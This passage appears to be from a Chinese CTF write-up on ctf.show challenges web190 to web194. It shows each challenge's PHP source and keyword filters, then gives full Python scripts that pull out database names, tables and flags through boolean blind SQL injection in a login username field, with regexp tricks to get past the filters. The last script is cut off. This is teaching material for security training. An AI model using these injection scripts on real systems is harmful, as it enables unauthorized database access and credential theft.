&lt;img data-src=&#34;\images\article_images\image-20250825230830996.png&#34; alt=&#34;image-20250825230830996&#34; style=&#34;zoom:50%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;爆破表名&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250825230448836.png&#34; alt=&#34;image-20250825230448836&#34; style=&#34;zoom:50%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;爆破字段&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250825230510423.png&#34; alt=&#34;image-20250825230510423&#34; style=&#34;zoom: 50%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;爆破flag&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250825230156934.png&#34; alt=&#34;image-20250825230156934&#34; style=&#34;zoom:50%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;import requests
import time

# ==================== 配置区 ====================
URL = &amp;quot;http://bcf69769-3d02-4adf-81f2-b1d47707987e.challenge.ctf.show/api/&amp;quot;

# POST 请求参数
USERNAME_PARAM = &amp;quot;username&amp;quot;
PASSWORD_PARAM = &amp;quot;password&amp;quot;
DEFAULT_PASSWORD = &amp;quot;123456&amp;quot;

# 爆破范围（ASCII）
ASCII_START = 32          # 空格开始
ASCII_END = 127           # ~ 结束
MAX_LEN = 45              # 最长 flag 长度

# SQL payload（注意：用 &amp;#123;&amp;#125; 占位符）
# PAYLOAD = &amp;quot;select database()&amp;quot;
# PAYLOAD = &amp;quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&amp;quot;
# PAYLOAD = &amp;quot;select group_concat(column_name) from information_schema.columns where table_name=&amp;#39;ctfshow_fl0g&amp;#39;&amp;quot;
PAYLOAD = &amp;quot;select f1ag from ctfshow_fl0g&amp;quot;

# 服务端响应中判断条件是否成立的关键字
SUCCESS_KEY = &amp;quot;密码错误&amp;quot;  # 填转义后的即可，下面有json处理

# 请求延迟（避免 WAF）
SLEEP_TIME = 0.05
# ==================== 配置区 ====================


def extract_flag():
    flag = &amp;quot;&amp;quot;
    for i in range(1, MAX_LEN + 1):
        start, end = ASCII_START, ASCII_END
        while start &amp;lt; end:
            mid = (start + end) &amp;gt;&amp;gt; 1
            # 构造 payload
            condition = f&amp;quot;ascii(substr((&amp;#123;PAYLOAD&amp;#125;), &amp;#123;i&amp;#125;, 1)) &amp;gt; &amp;#123;mid&amp;#125;&amp;quot; # 二分法
            inj = f&amp;quot;admin&amp;#39; and if(&amp;#123;condition&amp;#125;, 1, 2)=1#&amp;quot;

            data = &amp;#123;
                USERNAME_PARAM: inj,
                PASSWORD_PARAM: DEFAULT_PASSWORD
            &amp;#125;

            try:
                res = requests.post(URL, data=data, timeout=5)
                msg = res.json().get(&amp;quot;msg&amp;quot;, &amp;quot;&amp;quot;)
            except Exception as e:
                print(f&amp;quot;[!] 请求失败: &amp;#123;e&amp;#125;&amp;quot;)
                return flag

            if SUCCESS_KEY in msg:
                start = mid + 1
            else:
                end = mid

            time.sleep(SLEEP_TIME)

        # 一个字符确定
        flag += chr(start)
        print(f&amp;quot;[+] 当前进度: &amp;#123;flag&amp;#125;&amp;quot;)

        # 提前结束
        if flag.endswith(&amp;quot;&amp;#125;&amp;quot;):
            print(f&amp;quot;[✓] 最终结果: &amp;#123;flag&amp;#125;&amp;quot;)
            return flag

    print(f&amp;quot;[!] 达到最大长度，最终结果: &amp;#123;flag&amp;#125;&amp;quot;)
    return flag


if __name__ == &amp;quot;__main__&amp;quot;:
    extract_flag()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web191&#34;&gt;&lt;a href=&#34;#web191&#34; class=&#34;headerlink&#34; title=&#34;web191&#34;&gt;&lt;/a&gt;web191&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;查询语句
  //拼接sql语句查找指定ID用户
  $sql = &amp;quot;select pass from ctfshow_user where username = &amp;#39;&amp;#123;$username&amp;#125;&amp;#39;&amp;quot;;


返回逻辑
  //密码检测
  if(!is_numeric($password))&amp;#123;
    $ret[&amp;#39;msg&amp;#39;]=&amp;#39;密码只能为数字&amp;#39;;
    die(json_encode($ret));
  &amp;#125;

  //密码判断
  if($row[&amp;#39;pass&amp;#39;]==$password)&amp;#123;
      $ret[&amp;#39;msg&amp;#39;]=&amp;#39;登陆成功&amp;#39;;
    &amp;#125;

  //TODO:感觉少了个啥，奇怪
    if(preg_match(&amp;#39;/file|into|ascii/i&amp;#39;, $username))&amp;#123;
        $ret[&amp;#39;msg&amp;#39;]=&amp;#39;用户名非法&amp;#39;;
        die(json_encode($ret));
    &amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;ord()&lt;/code&gt;：ord函数返回字符串的第一个字符的ascii值&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;因此， &lt;code&gt;ascii() &lt;/code&gt; 函数和 &lt;code&gt;ord()&lt;/code&gt; 函数对于单字节处理两者作用一样&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250825232912490.png&#34; alt=&#34;image-20250825232912490&#34; style=&#34;zoom:33%;&#34; /&gt;

&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;import requests
import time

# ==================== 配置区 ====================
URL = &amp;quot;http://4953d4e6-b84c-42d4-aeb3-8be66b9feae2.challenge.ctf.show/api/&amp;quot;

# POST 请求参数
USERNAME_PARAM = &amp;quot;username&amp;quot;
PASSWORD_PARAM = &amp;quot;password&amp;quot;
DEFAULT_PASSWORD = &amp;quot;0&amp;quot;

# 爆破范围（ASCII）
ASCII_START = 32          # 空格开始
ASCII_END = 127           # ~ 结束
MAX_LEN = 45              # 最长 flag 长度

# SQL payload（注意：用 &amp;#123;&amp;#125; 占位符）
# PAYLOAD = &amp;quot;select database()&amp;quot;
# PAYLOAD = &amp;quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&amp;quot;
# PAYLOAD = &amp;quot;select group_concat(column_name) from information_schema.columns where table_name=&amp;#39;ctfshow_fl0g&amp;#39;&amp;quot;
PAYLOAD = &amp;quot;select f1ag from ctfshow_fl0g&amp;quot;

# 服务端响应中判断条件是否成立的关键字
SUCCESS_KEY = &amp;quot;密码错误&amp;quot;  # 填转义后的即可，下面有json处理

# 请求延迟（避免 WAF）
SLEEP_TIME = 0.05
# ==================== 配置区 ====================


def extract_flag():
    flag = &amp;quot;&amp;quot;
    for i in range(1, MAX_LEN + 1):
        start, end = ASCII_START, ASCII_END
        while start &amp;lt; end:
            mid = (start + end) &amp;gt;&amp;gt; 1
            # 构造 payload
            condition = f&amp;quot;ord(substr((&amp;#123;PAYLOAD&amp;#125;), &amp;#123;i&amp;#125;, 1)) &amp;gt; &amp;#123;mid&amp;#125;&amp;quot; # 二分法
            inj = f&amp;quot;admin&amp;#39; and if(&amp;#123;condition&amp;#125;, 1, 2)=1#&amp;quot;

            data = &amp;#123;
                USERNAME_PARAM: inj,
                PASSWORD_PARAM: DEFAULT_PASSWORD
            &amp;#125;

            try:
                res = requests.post(URL, data=data, timeout=5)
                msg = res.json().get(&amp;quot;msg&amp;quot;, &amp;quot;&amp;quot;)
            except Exception as e:
                print(f&amp;quot;[!] 请求失败: &amp;#123;e&amp;#125;&amp;quot;)
                return flag

            if SUCCESS_KEY in msg:
                start = mid + 1
            else:
                end = mid

            time.sleep(SLEEP_TIME)

        # 一个字符确定
        flag += chr(start)
        print(f&amp;quot;[+] 当前进度: &amp;#123;flag&amp;#125;&amp;quot;)

        # 提前结束
        if flag.endswith(&amp;quot;&amp;#125;&amp;quot;):
            print(f&amp;quot;[✓] 最终结果: &amp;#123;flag&amp;#125;&amp;quot;)
            return flag

    print(f&amp;quot;[!] 达到最大长度，最终结果: &amp;#123;flag&amp;#125;&amp;quot;)
    return flag


if __name__ == &amp;quot;__main__&amp;quot;:
    extract_flag()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web192&#34;&gt;&lt;a href=&#34;#web192&#34; class=&#34;headerlink&#34; title=&#34;web192&#34;&gt;&lt;/a&gt;web192&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;查询语句
  //拼接sql语句查找指定ID用户
  $sql = &amp;quot;select pass from ctfshow_user where username = &amp;#39;&amp;#123;$username&amp;#125;&amp;#39;&amp;quot;;


返回逻辑
  //密码检测
  if(!is_numeric($password))&amp;#123;
    $ret[&amp;#39;msg&amp;#39;]=&amp;#39;密码只能为数字&amp;#39;;
    die(json_encode($ret));
  &amp;#125;

  //密码判断
  if($row[&amp;#39;pass&amp;#39;]==$password)&amp;#123;
      $ret[&amp;#39;msg&amp;#39;]=&amp;#39;登陆成功&amp;#39;;
    &amp;#125;

  //TODO:感觉少了个啥，奇怪
    if(preg_match(&amp;#39;/file|into|ascii|ord|hex/i&amp;#39;, $username))&amp;#123;
        $ret[&amp;#39;msg&amp;#39;]=&amp;#39;用户名非法&amp;#39;;
        die(json_encode($ret));
    &amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;过滤了 &lt;code&gt;ascii&lt;/code&gt; 和 &lt;code&gt;ord&lt;/code&gt; ，使用正则函数逐个匹配字符&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250825234254961.png&#34; alt=&#34;image-20250825234254961&#34; style=&#34;zoom:50%;&#34; /&gt;

&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;import requests
import time

# ==================== 配置区 ====================
URL = &amp;quot;http://438b14df-480f-426e-9341-eec2a403489e.challenge.ctf.show/api/&amp;quot;

USERNAME_PARAM = &amp;quot;username&amp;quot;
PASSWORD_PARAM = &amp;quot;password&amp;quot;
DEFAULT_PASSWORD = &amp;quot;1&amp;quot;

# 爆破字符集
ALL_STR = &amp;quot;0123456789abcdefghijklmnopqrstuvwxyz-&amp;#123;&amp;#125;&amp;quot;
MAX_LEN = 45

# SQL payload
# PAYLOAD = &amp;quot;select database()&amp;quot;
# PAYLOAD = &amp;quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&amp;quot;
# PAYLOAD = &amp;quot;select group_concat(column_name) from information_schema.columns where table_name=&amp;#39;ctfshow_fl0g&amp;#39;&amp;quot;
PAYLOAD = &amp;quot;select f1ag from ctfshow_fl0g&amp;quot;

# 服务端响应判断关键字
SUCCESS_KEY = &amp;quot;密码错误&amp;quot;    # 填转义后的即可，下面有json处理

SLEEP_TIME = 0.05
# ==================== 配置区 ====================


def extract_flag():
    flag = &amp;quot;&amp;quot;
    for i in range(1, MAX_LEN + 1):
        found = False
        for ch in ALL_STR:
            # 构造 payload
            username_data = f&amp;quot;admin&amp;#39; and if(substr((&amp;#123;PAYLOAD&amp;#125;), &amp;#123;i&amp;#125;, 1) regexp &amp;#39;&amp;#123;ch&amp;#125;&amp;#39;, 1, 0)=1#&amp;quot;
            data = &amp;#123;
                USERNAME_PARAM: username_data,
                PASSWORD_PARAM: DEFAULT_PASSWORD
            &amp;#125;

            try:
                res = requests.post(URL, data=data, timeout=5)
                msg = res.json().get(&amp;quot;msg&amp;quot;, &amp;quot;&amp;quot;)
            except Exception as e:
                print(f&amp;quot;[!] 请求失败: &amp;#123;e&amp;#125;&amp;quot;)
                return flag

            if SUCCESS_KEY in msg:
                flag += ch
                print(f&amp;quot;[+] 当前进度: &amp;#123;flag&amp;#125;&amp;quot;)
                found = True
                break

            time.sleep(SLEEP_TIME)

        if not found:
            # 没匹配到，可能是 flag 结束
            if flag.endswith(&amp;quot;&amp;#125;&amp;quot;):
                print(f&amp;quot;[✓] 最终结果: &amp;#123;flag&amp;#125;&amp;quot;)
                return flag
            else:
                print(f&amp;quot;[!] 第&amp;#123;i&amp;#125;个字符未匹配到，停止爆破&amp;quot;)
                return flag

        if flag.endswith(&amp;quot;&amp;#125;&amp;quot;):
            print(f&amp;quot;[✓] 最终结果: &amp;#123;flag&amp;#125;&amp;quot;)
            return flag

    print(f&amp;quot;[!] 达到最大长度，最终结果: &amp;#123;flag&amp;#125;&amp;quot;)
    return flag


if __name__ == &amp;quot;__main__&amp;quot;:
    extract_flag()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web193&#34;&gt;&lt;a href=&#34;#web193&#34; class=&#34;headerlink&#34; title=&#34;web193&#34;&gt;&lt;/a&gt;web193&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;查询语句
  //拼接sql语句查找指定ID用户
  $sql = &amp;quot;select pass from ctfshow_user where username = &amp;#39;&amp;#123;$username&amp;#125;&amp;#39;&amp;quot;;


返回逻辑
  //密码检测
  if(!is_numeric($password))&amp;#123;
    $ret[&amp;#39;msg&amp;#39;]=&amp;#39;密码只能为数字&amp;#39;;
    die(json_encode($ret));
  &amp;#125;

  //密码判断
  if($row[&amp;#39;pass&amp;#39;]==$password)&amp;#123;
      $ret[&amp;#39;msg&amp;#39;]=&amp;#39;登陆成功&amp;#39;;
    &amp;#125;

  //TODO:感觉少了个啥，奇怪
    if(preg_match(&amp;#39;/file|into|ascii|ord|hex|substr/i&amp;#39;, $username))&amp;#123;
        $ret[&amp;#39;msg&amp;#39;]=&amp;#39;用户名非法&amp;#39;;
        die(json_encode($ret));
    &amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;过滤了 &lt;code&gt;substr&lt;/code&gt; ，可以使用正则来代替，&lt;code&gt;^&lt;/code&gt;从第一位开始匹配&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;爆破库名&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250826001349157.png&#34; alt=&#34;image-20250826001349157&#34; style=&#34;zoom:50%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;爆破表名&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250826001623740.png&#34; alt=&#34;image-20250826001623740&#34; style=&#34;zoom:50%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;爆破字段&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250826001735520.png&#34; alt=&#34;image-20250826001735520&#34; style=&#34;zoom:50%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;爆破flag&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250826001943487.png&#34; alt=&#34;image-20250826001943487&#34; style=&#34;zoom:50%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;import requests
import time

# ==================== 配置区 ====================
URL = &amp;quot;http://af5d4c10-6649-4744-9a04-bb4cc4ca4810.challenge.ctf.show/api/&amp;quot;

USERNAME_PARAM = &amp;quot;username&amp;quot;
PASSWORD_PARAM = &amp;quot;password&amp;quot;
DEFAULT_PASSWORD = &amp;quot;1&amp;quot;

# 爆破字符集
ALL_STR = &amp;quot;0123456789abcdefghijklmnopqrstuvwxyz-,_&amp;#123;&amp;#125;&amp;quot;
MAX_LEN = 45

# SQL payload
# PAYLOAD = &amp;quot;select database()&amp;quot;
# PAYLOAD = &amp;quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&amp;quot;
# PAYLOAD = &amp;quot;select group_concat(column_name) from information_schema.columns where table_name=&amp;#39;ctfshow_flxg&amp;#39;&amp;quot;
PAYLOAD = &amp;quot;select f1ag from ctfshow_flxg&amp;quot;

# 服务端响应判断关键字
SUCCESS_KEY = &amp;quot;密码错误&amp;quot;    # 填转义后的即可，下面有json处理

SLEEP_TIME = 0.05
# ==================== 配置区 ====================


def extract_flag():
    flag = &amp;quot;&amp;quot;
    for i in range(1, MAX_LEN + 1):
        found = False
        for ch in ALL_STR:
            # 构造 payload
            username_data = f&amp;quot;admin&amp;#39; and if((&amp;#123;PAYLOAD&amp;#125;) regexp (&amp;#39;^&amp;#123;flag&amp;#125;&amp;#123;ch&amp;#125;&amp;#39;), 1, 0)=1#&amp;quot;
            data = &amp;#123;
                USERNAME_PARAM: username_data,
                PASSWORD_PARAM: DEFAULT_PASSWORD
            &amp;#125;

            try:
                res = requests.post(URL, data=data, timeout=5)
                msg = res.json().get(&amp;quot;msg&amp;quot;, &amp;quot;&amp;quot;)
            except Exception as e:
                print(f&amp;quot;[!] 请求失败: &amp;#123;e&amp;#125;&amp;quot;)
                return flag

            if SUCCESS_KEY in msg:
                flag += ch
                print(f&amp;quot;[+] 当前进度: &amp;#123;flag&amp;#125;&amp;quot;)
                found = True
                break

            time.sleep(SLEEP_TIME)

        if not found:
            # 没匹配到，可能是 flag 结束
            if flag.endswith(&amp;quot;&amp;#125;&amp;quot;):
                print(f&amp;quot;[✓] 最终结果: &amp;#123;flag&amp;#125;&amp;quot;)
                return flag
            else:
                print(f&amp;quot;[!] 第&amp;#123;i&amp;#125;个字符未匹配到，停止爆破&amp;quot;)
                return flag

        if flag.endswith(&amp;quot;&amp;#125;&amp;quot;):
            print(f&amp;quot;[✓] 最终结果: &amp;#123;flag&amp;#125;&amp;quot;)
            return flag

    print(f&amp;quot;[!] 达到最大长度，最终结果: &amp;#123;flag&amp;#125;&amp;quot;)
    return flag


if __name__ == &amp;quot;__main__&amp;quot;:
    extract_flag()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web194&#34;&gt;&lt;a href=&#34;#web194&#34; class=&#34;headerlink&#34; title=&#34;web194&#34;&gt;&lt;/a&gt;web194&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;查询语句
  //拼接sql语句查找指定ID用户
  $sql = &amp;quot;select pass from ctfshow_user where username = &amp;#39;&amp;#123;$username&amp;#125;&amp;#39;&amp;quot;;


返回逻辑
  //密码检测
  if(!is_numeric($password))&amp;#123;
    $ret[&amp;#39;msg&amp;#39;]=&amp;#39;密码只能为数字&amp;#39;;
    die(json_encode($ret));
  &amp;#125;

  //密码判断
  if($row[&amp;#39;pass&amp;#39;]==$password)&amp;#123;
      $ret[&amp;#39;msg&amp;#39;]=&amp;#39;登陆成功&amp;#39;;
    &amp;#125;

  //TODO:感觉少了个啥，奇怪
    if(preg_match(&amp;#39;/file|into|ascii|ord|hex|substr|char|left|right|substring/i&amp;#39;, $username))&amp;#123;
        $ret[&amp;#39;msg&amp;#39;]=&amp;#39;用户名非法&amp;#39;;
        die(json_encode($ret));
    &amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;可以使用web193的脚本解题&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250826002646514.png&#34; alt=&#34;image-20250826002646514&#34; style=&#34;zoom:50%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;import requests
import time

# ==================== 配置区 ====================
